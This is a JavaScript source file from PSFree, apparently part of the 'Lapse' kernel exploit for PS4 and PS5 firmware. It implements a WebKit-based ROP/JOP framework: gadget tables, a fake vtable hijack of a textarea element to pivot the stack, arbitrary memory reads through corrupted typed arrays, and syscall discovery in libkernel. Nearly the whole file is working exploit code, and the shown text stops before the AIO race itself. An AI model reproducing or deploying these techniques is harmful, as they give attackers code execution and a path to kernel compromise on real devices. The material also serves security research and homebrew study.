/* Copyright (C) 2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20). It
// takes advantage of a bug in aio_multi_delete(). Take a look at the comment
// at the race_one() function here for a brief summary.

// debug comment legend:
// * PANIC - code will make the system vulnerable to a kernel panic or it will
//   perform a operation that might panic
// * RESTORE - code will repair kernel panic vulnerability
// * MEMLEAK - memory leaks that our code will induce

// sys/mman.h
const MAP_SHARED = 1;
const MAP_FIXED = 0x10;
const MAP_ANON = 0x1000;
const MAP_PREFAULT_READ = 0x00040000;
// sys/rtprio.h
const RTP_LOOKUP = 0;
const RTP_SET = 1;
const RTP_PRIO_ITHD = 1;
const RTP_PRIO_REALTIME = 2;
const RTP_PRIO_NORMAL = 3;
const RTP_PRIO_IDLE = 4;
//
const PROT_READ = 0x01;
const PROT_WRITE = 0x02;
const PROT_EXEC = 0x04;
// SceAIO has 2 SceFsstAIO workers for each SceAIO Parameter. each Parameter
// has 3 queue groups: 4 main queues, 4 wait queues, and one unused queue
// group. queue 0 of each group is currently unused. queue 1 has the lowest
// priority and queue 3 has the highest
//
// the SceFsstAIO workers will process entries at the main queues. they will
// refill the main queues from the corresponding wait queues each time they
// dequeue a request (e.g. fill the  low priority main queue from the low
// priority wait queue)
//
// entries on the wait queue will always have a 0 ticket number. they will
// get assigned a nonzero ticket number once they get put on the main queue
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const num_workers = 2;
// max number of requests that can be created/polled/canceled/deleted/waited
const max_aio_ids = 0x80;
var off_kstr;
var off_cpuid_to_pcpu;
var off_sysent_661;
var jmp_rsi;
//var patch_elf_loc;
var pthread_offsets;
var syscall_array;
var libwebkit_base;
var libkernel_base;
var libc_base;
var webkit_gadget_offsets;
var libc_gadget_offsets;
var libkernel_gadget_offsets;
var gadgets;
var off_ta_vt;
var off_wk_stack_chk_fail;
var off_scf;
var off_wk_strlen;
var off_strlen;
var Chain;
var chain;
var nogc;
var text_magic;
// put the sycall names that you want to use here
var syscall_map;
// highest priority we can achieve given our credentials
// Initialize rtprio lazily to avoid TDZ issues
var rtprio = null;
// the various SceAIO syscalls that copies out errors/states will not check if
// the address is NULL and will return EFAULT. this dummy buffer will serve as
// the default argument so users don't need to specify one
var _aio_errors = null;
// Initialize _aio_errors_p lazily to avoid TDZ issues with mem
var _aio_errors_p = null;

function get_view_vector(view) {
  if (!ArrayBuffer.isView(view)) {
    throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
  }
  if (mem === null) {
    throw Error('mem is not initialized. make_arw() must be called first to initialize mem.');
  }
  return mem.addrof(view).readp(off_view_m_vector);
}

function rw_write64(u8_view, offset, value) {
  if (!(value instanceof Int)) {
    throw TypeError('write64 value must be an Int');
  }
  const low = value.lo;
  const high = value.hi;
  for (var i = 0; i < 4; i++) {
    u8_view[offset + i] = (low >>> (i * 8)) & 0xff;
  }
  for (var i = 0; i < 4; i++) {
    u8_view[offset + 4 + i] = (high >>> (i * 8)) & 0xff;
  }
}

// ROP chain manager base class
// Args:
//   stack_size: the size of the stack
//   upper_pad: the amount of extra space above stack
class ChainBase {
  constructor(stack_size=0x1000, upper_pad=0x10000) {
    this._is_dirty = false;
    this.position = 0;
    const return_value = new Uint32Array(4);
    this._return_value = return_value;
    this.retval_addr = get_view_vector(return_value);
    const errno = new Uint32Array(1);
    this._errno = errno;
    this.errno_addr = get_view_vector(errno);
    const full_stack_size = upper_pad + stack_size;
    const stack_buffer = new ArrayBuffer(full_stack_size);
    const stack = new DataView(stack_buffer, upper_pad);
    this.stack = stack;
    this.stack_addr = get_view_vector(stack);
    this.stack_size = stack_size;
    this.full_stack_size = full_stack_size;
  }
  // use this if you want to write a new ROP chain but don't want to allocate
  // a new instance
  empty() {
    this.position = 0;
  }
  // flag indicating whether .run() was ever called with this chain
  get is_dirty() {
    return this._is_dirty;
  }
  clean() {
    this._is_dirty = false;
  }
  dirty() {
    this._is_dirty = true;
  }
  check_allow_run() {
    if (this.position === 0) {
      throw Error('chain is empty');
    }
    if (this.is_dirty) {
      throw Error('chain already ran, clean it first');
    }
  }
  reset() {
    this.empty();
    this.clean();
  }
  get retval_int() {
    return this._return_value[0] | 0;
  }
  get retval() {
    return new Int(this._return_value[0], this._return_value[1]);
  }
  // return value as a pointer
  get retval_ptr() {
    return new Addr(this._return_value[0], this._return_value[1]);
  }
  set retval(value) {
    const values = lohi_from_one(value);
    const retval = this._return_value;
    retval[0] = values[0];
    retval[1] = values[1];
  }
  get retval_all() {
    const retval = this._return_value;
    return [new Int(retval[0], retval[1]), new Int(retval[2], retval[3])];
  }
  set retval_all(values) {
    const [a, b] = [lohi_from_one(values[0]), lohi_from_one(values[1])];
    const retval = this._return_value;
    retval[0] = a[0];
    retval[1] = a[1];
    retval[2] = b[0];
    retval[3] = b[1];
  }
  get errno() {
    return this._errno[0];
  }
  set errno(value) {
    this._errno[0] = value;
  }
  push_value(value) {
    const position = this.position;
    if (position >= this.stack_size) {
      throw Error(`no more space on the stack, pushed value: ${value}`);
    }
    const values = lohi_from_one(value);
    const stack = this.stack;
    stack.setUint32(position, values[0], true);
    stack.setUint32(position + 4, values[1], true);
    this.position += 8;
  }
  get_gadget(insn_str) {
    const addr = this.gadgets.get(insn_str);
    if (addr === undefined) {
      throw Error(`gadget not found: ${insn_str}`);
    }
    return addr;
  }
  push_gadget(insn_str) {
    this.push_value(this.get_gadget(insn_str));
  }
  push_call(func_addr, ...args) {
    const argument_pops = [
      'pop rdi; ret',
      'pop rsi; ret',
      'pop rdx; ret',
      'pop rcx; ret',
      'pop r8; ret',
      'pop r9; ret'
    ];
    if (args.length > 6) {
      throw TypeError('push_call() does not support functions that have more than 6 arguments');
    }
    for (var i = 0; i < args.length; i++) {
      this.push_gadget(argument_pops[i]);
      this.push_value(args[i]);
    }
    // The address of our buffer seems to be always aligned to 8 bytes.
    // SysV calling convention requires the stack is aligned to 16 bytes on
    // function entry, so push an additional 8 bytes to pad the stack. We
    // pushed a "ret" gadget for a noop.
    if ((this.position & (0x10 - 1)) !== 0) {
      this.push_gadget('ret');
    }
    if (typeof func_addr === 'string') {
      this.push_gadget(func_addr);
    } else {
      this.push_value(func_addr);
    }
  }
  push_syscall(syscall_name, ...args) {
    if (typeof syscall_name !== 'string') {
      throw TypeError(`syscall_name not a string: ${syscall_name}`);
    }
    const sysno = syscall_map.get(syscall_name);
    if (sysno === undefined) {
      throw Error(`syscall_name not found: ${syscall_name}`);
    }
    const syscall_addr = this.syscall_array[sysno];
    if (syscall_addr === undefined) {
      throw Error(`syscall number not in syscall_array: ${sysno}`);
    }
    this.push_call(syscall_addr, ...args);
  }
  // Sets needed class properties
  // Args:
  //   gadgets:
  //     A Map-like object mapping instruction strings (e.g. "pop rax; ret")
  //     to their addresses in memory.
  //   syscall_array:
  //     An array whose indices correspond to syscall numbers. Maps syscall
  //     numbers to their addresses in memory. Defaults to an empty Array.
  static init_class(gadgets, syscall_array=[]) {
    this.prototype.gadgets = gadgets;
    this.prototype.syscall_array = syscall_array;
  }
  // START: implementation-dependent parts
  // the user doesn't need to implement all of these. just the ones they need
  // Firmware specific method to launch a ROP chain
  // Proper implementations will check if .position is nonzero before
  // running. Implementations can optionally check .is_dirty to enforce
  // single-run gadget sequences
  run() {
    throw Error('not implemented');
  }
  // anything you need to do before the ROP chain jumps back to JavaScript
  push_end() {
    throw Error('not implemented');
  }
  push_get_errno() {
    throw Error('not implemented');
  }
  push_clear_errno() {
    throw Error('not implemented');
  }
  // get the rax register
  push_get_retval() {
    throw Error('not implemented');
  }
  // get the rax and rdx registers
  push_get_retval_all() {
    throw Error('not implemented');
  }
  // END: implementation-dependent parts
  // note that later firmwares (starting around > 5.00?), the browser doesn't
  // have a JIT compiler. we programmed in a way that tries to make the
  // resulting bytecode be optimal
  // we intentionally have an incomplete set (there's no function to get a
  // full 128-bit result). we only implemented what we think are the common
  // cases. the user will have to implement those other functions if they
  // need it
  do_call(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_call(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  call_void(...args) {
    this.do_call(...args);
  }
  call_int(...args) {
    this.do_call(...args);
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  call(...args) {
    this.do_call(...args);
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  do_syscall(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_syscall(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  syscall_void(...args) {
    this.do_syscall(...args);
  }
  syscall_int(...args) {
    this.do_syscall(...args);
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  syscall(...args) {
    this.do_syscall(...args);
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  syscall_ptr(...args) {
    this.do_syscall(...args);
    const retval = this._return_value;
    return new Addr(retval[0], retval[1]);
  }
  // syscall variants that throw an error on errno
  do_syscall_clear_errno(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_clear_errno();
      this.push_syscall(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  sysi(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  sys(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  sysp(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    const retval = this._return_value;
    return new Addr(retval[0], retval[1]);
  }
}

function get_gadget(map, insn_str) {
  const addr = map.get(insn_str);
  if (addr === undefined) {
    throw Error(`gadget not found: ${insn_str}`);
  }
  return addr;
}

// Chain implementation based on Chain803. Replaced offsets that changed
// between versions. Replaced gadgets that were missing with new ones that
// won't change the API.
// gadgets for the JOP chain
// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
// because jop1-5 was the original chain used by the old implementation of
// Chain803. Now the sequence is jop1-3 then to jop2-5.
// When the scrollLeft getter native function is called on PS4 9.00, rsi is the
// JS wrapper for the WebCore textarea class.
const jop1 = `
mov rdi, qword ptr [rsi + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0xb8]
`;
// Since the method of code redirection we used is via redirecting a call to
// jump to our JOP chain, we have the return address of the caller on entry.
// jop1 pushed another object (via the call instruction) but we want no
// extra objects between the return address and the rbp that will be pushed by
// jop2 later. So we pop the return address pushed by jop1.
// This will make pivoting back easy, just "leave; ret".
const jop2 = `
pop rsi
jmp qword ptr [rax + 0x1c]
`;
const jop3 = `
mov rdi, qword ptr [rax + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x30]
`;
// rbp is now pushed, any extra objects pushed by the call instructions can be ignored
const jop4 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x58]
`;
const jop5 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop6 = `
push rdx
jmp qword ptr [rax]
`;
const jop7 = 'pop rsp; ret';
// the ps4 firmware is compiled to use rbp as a frame pointer
// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
// restore rbp (if needed) before the epilogue.
// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
// pushed earlier before the pivot, thus restoring the old rbp).
// leave instruction equivalent:
//     mov rsp, rbp
//     pop rbp
const jop8 = `
mov rdi, qword ptr [rsi + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x70]
`;
const jop9 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x30]
`;
const jop10 = `
mov rdx, qword ptr [rdx + 0x50]
mov ecx, 0xa
call qword ptr [rax + 0x40]
`;
const jop11 = `
pop rsi
cmc
jmp qword ptr [rax + 0x7c]
`;

function resolve_import(import_addr) {
  if (import_addr.read16(0) !== 0x25ff) {
    throw Error(
      `instruction at ${import_addr} is not of the form: jmp qword`
      + ' [rip + X]');
  }
  // module_function_import:
  //     jmp qword [rip + X]
  //     ff 25 xx xx xx xx // signed 32-bit displacement
  const disp = import_addr.read32(2);
  // assume disp and offset are 32-bit integers
  // x | 0 will always be a signed integer
  const offset = (disp | 0) + 6;
  // The rIP value used by "jmp [rip + X]" instructions is actually the rIP
  // of the next instruction. This means that the actual address used is
  // [rip + X + sizeof(jmp_insn)], where sizeof(jmp_insn) is the size of the
  // jump instruction, which is 6 in this case.
  const function_addr = import_addr.readp(offset);
  return function_addr;
}

// these values came from analyzing dumps from CelesteBlue
function check_magic_at(p, is_text) {
  const value = [p.read64(0), p.read64(8)];
  return value[0].eq(text_magic[0]) && value[1].eq(text_magic[1]);
}

function find_base(addr, is_text, is_back) {
  // align to page size
  addr = align(addr, page_size);
  text_magic = [
    new Int(0xe5894855, 0x56415741),
    new Int(0x54415541, 0x8d485053)
  ];
  const offset = (is_back ? -1 : 1) * page_size;
  while (true) {
    if (check_magic_at(addr, is_text)) {
      break;
    }
    addr = addr.add(offset);
  }
  return addr;
}

function get_bases() {
  if (mem === null) {
    throw Error('mem is not initialized. make_arw() must be called first to initialize mem.');
  }
  const off_jsta_impl = 0x18;
  const textarea = document.createElement('textarea');
  const webcore_textarea = mem.addrof(textarea).readp(off_jsta_impl);
  const textarea_vtable = webcore_textarea.readp(0);
  // Debugging log; find offset off_ta_vt
  //log("off_ta_vt: " + (textarea_vtable - find_base(textarea_vtable, true, true)));
  //throw Error('Operation cancelled!');
  libwebkit_base = textarea_vtable.sub(off_ta_vt);
  const stack_chk_fail_import = libwebkit_base.add(off_wk_stack_chk_fail);
  const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
  // Debugging log; find offset off_scf
  //log("off_scf: " + (stack_chk_fail_addr - find_base(stack_chk_fail_addr, true, true)));
  //throw Error('Operation cancelled!');
  libkernel_base = stack_chk_fail_addr.sub(off_scf);
  const strlen_import = libwebkit_base.add(off_wk_strlen);
  const strlen_addr = resolve_import(strlen_import);
  // Debugging log; find offset off_strlen
  //log("off_strlen: " + (strlen_addr - find_base(strlen_addr, true, true)));
  //throw Error('Operation cancelled!');
  libc_base = strlen_addr.sub(off_strlen);
}

function init_gadget_map(gadget_map, offset_map, base_addr) {
  for (const [insn, offset] of offset_map) {
    gadget_map.set(insn, base_addr.add(offset));
  }
}

class Chain900Base extends ChainBase {
  push_end() {
    this.push_gadget('leave; ret');
  }
  push_get_retval() {
    this.push_gadget('pop rdi; ret');
    this.push_value(this.retval_addr);
    this.push_gadget('mov qword ptr [rdi], rax; ret');
  }
  push_get_errno() {
    this.push_gadget('pop rdi; ret');
    this.push_value(this.errno_addr);
    this.push_call(this.get_gadget('__error'));
    this.push_gadget('mov rax, qword ptr [rax]; ret');
    this.push_gadget('mov dword ptr [rdi], eax; ret');
  }
  push_clear_errno() {
    this.push_call(this.get_gadget('__error'));
    this.push_gadget('pop rsi; ret');
    this.push_value(0);
    this.push_gadget('mov dword ptr [rax], esi; ret');
  }
}
class Chain700_852 extends Chain900Base {
  constructor() {
    super();
    const [rdx, rdx_bak] = mem.gc_alloc(0x58);
    const off_js_cell = 0;
    rdx.write64(off_js_cell, this._empty_cell);
    rdx.write64(0x50, this.stack_addr);
    this._rsp = mem.fakeobj(rdx);
  }
  run() {
    this.check_allow_run();
    this._rop.launch = this._rsp;
    this.dirty();
  }
}
class Chain900_960 extends Chain900Base {
  constructor() {
    super();
    // Create a DOM object (textarea) which is used as the exploit pivot source.
    var textarea = document.createElement('textarea');
    this._textarea = textarea;
    // Get the JS and WebCore pointers associated with the textarea element.
    var js_ta = mem.addrof(textarea);
    var webcore_ta = js_ta.readp(0x18);
    this._webcore_ta = webcore_ta;
    // Allocate a fake vtable.
    // - Uint8Array is lightweight and fast.
    // - 0x200 bytes is enough for all required gadget offsets.
    // - A reference is stored to prevent garbage collection.
    var vtable = new Uint8Array(0x200);
    var old_vtable_p = webcore_ta.readp(0);
    this._vtable = vtable; // Prevent GC
    this._old_vtable_p = old_vtable_p; // Used for possible restore
    // Write needed JOP entry gadgets into the fake vtable.
    rw_write64(vtable, 0x1b8, this.get_gadget(jop1));
    if ((config_target >= 0x900) && (config_target < 0x950)) {
      rw_write64(vtable, 0xb8, this.get_gadget(jop2));
      rw_write64(vtable, 0x1c, this.get_gadget(jop3));
    } else {
      rw_write64(vtable, 0xb8, this.get_gadget(jop11));
      rw_write64(vtable, 0x7c, this.get_gadget(jop3));
    }
    // Allocate rax_ptrs, which serves as the JOP pointer table.
    // - This buffer must be referenced on the class instance to avoid GC.
    var rax_ptrs = new Uint8Array(0x100);
    var rax_ptrs_p = get_view_vector(rax_ptrs);
    this._rax_ptrs = rax_ptrs; // Prevent GC
    rw_write64(rax_ptrs, 0x30, this.get_gadget(jop4));
    rw_write64(rax_ptrs, 0x58, this.get_gadget(jop5));
    rw_write64(rax_ptrs, 0x10, this.get_gadget(jop6));
    rw_write64(rax_ptrs, 0x00, this.get_gadget(jop7));
    // Stack pivot target
    rw_write64(this._rax_ptrs, 0x18, this.stack_addr);
    // Allocate jop_buffer which holds a pointer to rax_ptrs.
    // - Must also be preserved to prevent garbage collection.
    var jop_buffer = new Uint8Array(8);
    var jop_buffer_p = get_view_vector(jop_buffer);
    this._jop_buffer = jop_buffer; // Prevent GC
    rw_write64(jop_buffer, 0, rax_ptrs_p);
    // Link jop_buffer into the fake vtable.
    // - This is the actual JOP entry point used by WebKit.
    rw_write64(vtable, 8, jop_buffer_p);
  }
  run() {
    this.check_allow_run();
    // change vtable
    this._webcore_ta.write64(0, get_view_vector(this._vtable));
    // jump to JOP chain
    this._textarea.scrollLeft;
    // restore vtable
    this._webcore_ta.write64(0, this._old_vtable_p);
    this.dirty();
  }
}

// creates an ArrayBuffer whose contents is copied from addr
function make_buffer(addr, size) {
  // see enum TypedArrayMode from
  // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferView.h
  // at webkitgtk 2.34.4
  //
  // see possiblySharedBuffer() from
  // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferViewInlines.h
  // at webkitgtk 2.34.4

  // We will create an OversizeTypedArray via requesting an Uint8Array whose
  // number of elements will be greater than fastSizeLimit (1000).
  //
  // We will not use a FastTypedArray since its m_vector is visited by the
  // GC and we will temporarily change it. The GC expects addresses from the
  // JS heap, and that heap has metadata that the GC uses. The GC will likely
  // crash since valid metadata won't likely be found at arbitrary addresses.
  //
  // The FastTypedArray approach will have a small time frame where the GC
  // can inspect the invalid m_vector field.
  //
  // Views created via "new TypedArray(x)" where "x" is a number will always
  // have an m_mode < WastefulTypedArray.
  const u = new Uint8Array(1001);
  const u_addr = mem.addrof(u);
  // we won't change the butterfly and m_mode so we won't save those
  const old_addr = u_addr.read64(off_view_m_vector);
  const old_size = u_addr.read32(off_view_m_length);
  u_addr.write64(off_view_m_vector, addr);
  u_addr.write32(off_view_m_length, size);
  const copy = new Uint8Array(u.length);
  copy.set(u);
  // Views with m_mode < WastefulTypedArray don't have an ArrayBuffer object
  // associated with them, if we ask for view.buffer, the view will be
  // converted into a WastefulTypedArray and an ArrayBuffer will be created.
  // This is done by calling slowDownAndWasteMemory().
  //
  // We can't use slowDownAndWasteMemory() on u since that will create a
  // JSC::ArrayBufferContents with its m_data pointing to addr. On the
  // ArrayBuffer's death, it will call WTF::fastFree() on m_data. This can
  // cause a crash if the m_data is not from the fastMalloc heap, and even if
  // it is, freeing abitrary addresses is dangerous as it may lead to a
  // use-after-free.
  const res = copy.buffer;
  // restore
  u_addr.write64(off_view_m_vector, old_addr);
  u_addr.write32(off_view_m_length, old_size);
  return res;
}

function init_syscall_array(
  syscall_array,
  libkernel_web_base,
  max_search_size
) {
  if ((typeof max_search_size !== 'number') || !isFinite(max_search_size) || (Math.floor(max_search_size) !== max_search_size)) {
    throw TypeError(
      `max_search_size is not a integer: ${max_search_size}`);
  }
  if (max_search_size < 0) {
    throw Error(`max_search_size is less than 0: ${max_search_size}`);
  }
  const libkernel_web_buffer = make_buffer(
    libkernel_web_base,
    max_search_size
  );
  const kbuf = new BufferView(libkernel_web_buffer);
  // Search 'rdlo' string from libkernel_web's .rodata section to gain an
  // upper bound on the size of the .text section.
  var text_size = 0;
  var found = false;
  for (var i = 0; i < max_search_size; i++) {
    if (kbuf[i] === 0x72
      && kbuf[i + 1] === 0x64
      && kbuf[i + 2] === 0x6c
      && kbuf[i + 3] === 0x6f
    ) {
      text_size = i;
      found = true;
      break;
    }
  }
  if (!found) {
    throw Error(
      '"rdlo" string not found in libkernel_web, base address:'
      + ` ${libkernel_web_base}`);
  }
  // search for the instruction sequence:
  // syscall_X:
  //     mov rax, X
  //     mov r10, rcx
  //     syscall
  for (var i = 0; i < text_size; i++) {
    if (kbuf[i] === 0x48
      && kbuf[i + 1] === 0xc7
      && kbuf[i + 2] === 0xc0
      && kbuf[i + 7] === 0x49
      && kbuf[i + 8] === 0x89
      && kbuf[i + 9] === 0xca
      && kbuf[i + 10] === 0x0f
      && kbuf[i + 11] === 0x05
    ) {
      const syscall_num = kbuf.read32(i + 3);
      syscall_array[syscall_num] = libkernel_web_base.add(i);
      // skip the sequence
      i += 11;
    }
  }
}

function rop_init() {
  get_bases();
  init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
  init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
  init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
  init_syscall_array(syscall_array, libkernel_base, 300 * KB);
  if ((config_target >= 0x700) && (config_target < 0x900)) {
    var gs = Object.getOwnPropertyDescriptor(window, "location").set;
    // JSCustomGetterSetter.m_getterSetter
    gs = mem.addrof(gs).readp(0x28);
    // sizeof JSC::CustomGetterSetter
    const size_cgs = 0x18;
    const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
    mem.cpy(gc_buf, gs, size_cgs);
    // JSC::CustomGetterSetter.m_setter
    gc_buf.write64(0x10, get_gadget(gadgets, jop8));
    const proto = Chain.prototype;
    // _rop must have a descriptor initially in order for the structure to pass
    // setHasReadOnlyOrGetterSetterPropertiesExcludingProto() thus forcing a
    // call to JSObject::putInlineSlow(). putInlineSlow() is the code path that
    // checks for any descriptor to run
    //
    // the butterfly's indexing type must be something the GC won't inspect
    // like DoubleShape. it will be used to store the JOP table's pointer
    const _rop = {
      get launch() {
        throw Error("never call");
      },
      0: 1.1,
    };
    // replace .launch with the actual custom getter/setter
    mem.addrof(_rop).write64(off_js_inline_prop, gc_buf);
    proto._rop = _rop;
    // JOP table
    var rax_ptrs = new Uint8Array(0x100);
    var rax_ptrs_p = get_view_vector(rax_ptrs);
    this._rax_ptrs = rax_ptrs; // Prevent GC
    proto._rax_ptrs = rax_ptrs;
    rw_write64(rax_ptrs, 0x70, get_gadget(gadgets, jop9));
    rw_write64(rax_ptrs, 0x30, get_gadget(gadgets, jop10));
    rw_write64(rax_ptrs, 0x40, get_gadget(gadgets, jop6));
    rw_write64(rax_ptrs, 0x00, get_gadget(gadgets, jop7));
    const jop_buffer_p = mem.addrof(_rop).readp(off_js_butterfly);
    jop_buffer_p.write64(0, rax_ptrs_p);
    const empty = {};
    const off_js_cell = 0;
    proto._empty_cell = mem.addrof(empty).read64(off_js_cell);
  }
  //log('syscall_array:');
  //log(syscall_array);
  Chain.init_class(gadgets, syscall_array);
}

function ViewMixin(superclass) {
  const res = class extends superclass {
    constructor(...args) {
      super(...args);
      this.buffer;
    }
    get addr() {
      var res = this._addr_cache;
      if (res !== undefined) {
        return res;
      }
      res = get_view_vector(this);
      this._addr_cache = res;
      return res;
    }
    get size() {
      return this.byteLength;
    }
    addr_at(index) {
      const size = this.BYTES_PER_ELEMENT;
      return this.addr.add(index * size);
    }
    sget(index) {
      return this[index] | 0;
    }
  };
  // workaround for known affected versions: ps4 [6.00, 10.00)
  // see from() and of() from
  // WebKit/Source/JavaScriptCore/builtins/TypedArrayConstructor.js at PS4
  // 8.0x
  // @getByIdDirectPrivate(this, "allocateTypedArray") will fail when "this"
  // isn't one of the built-in TypedArrays. this is a violation of the
  // ECMAScript spec at that time
  // TODO assumes ps4, support ps5 as well
  // FIXME define the from/of workaround functions once
  res.from = function from(...args) {
    const base = this.__proto__;
    return new this(base.from(...args).buffer);
  };
  res.of = function of(...args) {
    const base = this.__proto__;
    return new this(base.of(...args).buffer);
  };
  return res;
}
class View1 extends ViewMixin(Uint8Array) {}
class View2 extends ViewMixin(Uint16Array) {}
class View4 extends ViewMixin(Uint32Array) {}
class Buffer extends BufferView {
  get addr() {
    var res = this._addr_cache;
    if (res !== undefined) {
      return res;
    }
    res = get_view_vector(this);
    this._addr_cache = res;
    return res;
  }
  get size() {
    return this.byteLength;
  }
  addr_at(index) {
    return this.addr.add(index);
  }
}
// see from() and of() comment above
Buffer.from = function from(...args) {
  const base = this.__proto__;
  return new this(base.from(...args).buffer);
};
Buffer.of = function of(...args) {
  const base = this.__proto__;
  return new this(base.of(...args).buffer);
};
const VariableMixin = superclass => class extends superclass {
  constructor(value=0) {
    // unlike the View classes, we don't allow number coercion. we
    // explicitly allow floats unlike Int
    if (typeof value !== 'number') {
      throw TypeError('value not a number');
    }
    super([value]);
  }
  addr_at(...args) {
    throw TypeError('unimplemented method');
  }
  [Symbol.toPrimitive](hint) {
    return this[0];
  }
  toString(...args) {
    return this[0].toString(...args);
  }
};
class Word extends VariableMixin(View4) {}
// mutable Int (we are explicitly using Int's private fields)
const Word64Mixin = superclass => class extends superclass {
  constructor(...args) {
    if (!args.length) {
      return super(0);
    }
    super(...args);
  }
  get addr() {
    // assume this is safe to cache
    return get_view_vector(this._u32);
  }
  get length() {
    return 1;
  }
  get size() {
    return 8;
  }
  get byteLength() {
    return 8;
  }
  // no setters for top and bot since low/high can accept negative integers
  get lo() {
    return super.lo;
  }
  set lo(value) {
    this._u32[0] = value;
  }
  get hi() {
    return super.hi;
  }
  set hi(value) {
    this._u32[1] = value;
  }
  set(value) {
    const buffer = this._u32;
    const values = lohi_from_one(value);
    buffer[0] = values[0];
    buffer[1] = values[1];
  }
};
class Long extends Word64Mixin(Int) {
  as_addr() {
    return new Addr(this);
  }
}
class Pointer extends Word64Mixin(Addr) {}
// create a char array like in the C language
// string to view since it's easier to get the address of the buffer this way
function cstr(str) {
  str += '\0';
  return View1.from(str, c => c.codePointAt(0));
}
// make a JavaScript string
function jstr(buffer) {
  var res = '';
  for (const item of buffer) {
    if (item === 0) {
      break;
    }
    res += String.fromCodePoint(item);
  }
  // convert to primitive string
  return String(res);
}

function get_rtprio() {
  if (rtprio === null) {
    rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);
  }
  return rtprio;
}

function get_aio_errors_p() {
  if (_aio_errors === null) {
    _aio_errors = new View4(max_aio_ids);
  }
  if (_aio_errors_p === null) {
    _aio_errors_p = _aio_errors.addr;
  }
  return _aio_errors_p;
}
//================================================================================================
// LAPSE INIT FUNCTION ===========================================================================
//================================================================================================
async function lapse_init() {
  rop_init();
  chain = new Chain();
  init_gadget_map(gadgets, pthread_offsets, libkernel_base);
}

function sys_void(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  return chain.syscall_void(...args);
}

function sysi(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  return chain.sysi(...args);
}

function call_nze(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  const res = chain.call_int(...args);
  if (res !== 0) {
    die(`call(${args[0]}) returned nonzero: ${res}`);
  }
}
// #define SCE_KERNEL_AIO_STATE_NOTIFIED       0x10000
//
// #define SCE_KERNEL_AIO_STATE_SUBMITTED      1
// #define SCE_KERNEL_AIO_STATE_PROCESSING     2
// #define SCE_KERNEL_AIO_STATE_COMPLETED      3
// #define SCE_KERNEL_AIO_STATE_ABORTED        4
//
// typedef struct SceKernelAioResult {
//     // errno / SCE error code / number of bytes processed
//     int64_t returnValue;
//     // SCE_KERNEL_AIO_STATE_*
//     uint32_t state;
// } SceKernelAioResult;
//
// typedef struct SceKernelAioRWRequest {
//     off_t offset;
//     size_t nbyte;
//     void *buf;
//     struct SceKernelAioResult *result;
//     int fd;
// } SceKernelAioRWRequest;
//
// typedef int SceKernelAioSubmitId;
//
// // SceAIO submit commands
// #define SCE_KERNEL_AIO_CMD_READ     0x001
// #define SCE_KERNEL_AIO_CMD_WRITE    0x002
// #define SCE_KERNEL_AIO_CMD_MASK     0xfff
// // SceAIO submit command flags
// #define SCE_KERNEL_AIO_CMD_MULTI 0x1000
//
